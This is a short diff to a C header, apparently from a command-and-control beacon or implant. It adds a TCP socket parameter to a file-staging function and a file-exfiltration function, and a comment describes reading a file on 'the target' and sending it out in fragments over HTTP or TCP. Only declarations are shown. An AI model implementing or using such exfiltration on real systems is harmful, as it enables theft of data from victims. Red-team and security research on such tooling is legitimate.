@@ -10,12 +10,14 @@
 void handle_file_stage(uint32_t beacon_id, uint32_t label,
                        uint32_t identifier, uint16_t flags,
                        const uint8_t *data, uint32_t len,
-                       const uint8_t session_key[32]);
+                       const uint8_t session_key[32],
+                       SOCKET tcp_sock);
 
 /* handle_file_exfil: reads src_path on the target, sends contents as
    fragmented Type=4 results. Fragment 0 carries
    [uint16 basename_len][basename_bytes][chunk_bytes]; others carry
-   only [chunk_bytes]. Sends one POST per 64KB chunk. */
+   only [chunk_bytes]. Uses HTTP POST or TCP envelope (session mode). */
 void handle_file_exfil(uint32_t beacon_id, uint32_t label,
                        const char *src_path,
-                       const uint8_t session_key[32]);
+                       const uint8_t session_key[32],
+                       SOCKET tcp_sock);
